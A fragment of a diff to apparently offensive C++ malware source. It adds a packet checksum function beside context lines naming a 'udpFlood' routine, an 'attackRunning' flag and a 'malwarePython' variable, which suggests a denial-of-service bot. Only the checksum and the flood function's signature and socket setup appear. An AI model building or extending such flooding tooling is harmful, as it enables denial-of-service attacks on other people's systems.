@@ -29,6 +29,29 @@ string malwarePython;
 
 bool attackRunning = false;
 
+unsigned short csum(unsigned short *ptr, int nbytes) {
+    unsigned long sum;
+    unsigned short oddbyte;
+    unsigned short answer;
+
+    sum = 0;
+    while (nbytes > 1) {
+        sum += *ptr++;
+        nbytes -= 2;
+    }
+    if (nbytes == 1) {
+        oddbyte = 0;
+        *((u_char*)&oddbyte) = *(u_char*)ptr;
+        sum += oddbyte;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum = sum + (sum >> 16);
+    answer = (unsigned short)~sum;
+
+    return answer;
+}
+
 void udpFlood(string ip, int port) {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     sockaddr_in destAddr{};
@@ -446,4 +469,4 @@ int main() {
     }
 
     return 0;
-}
+} 
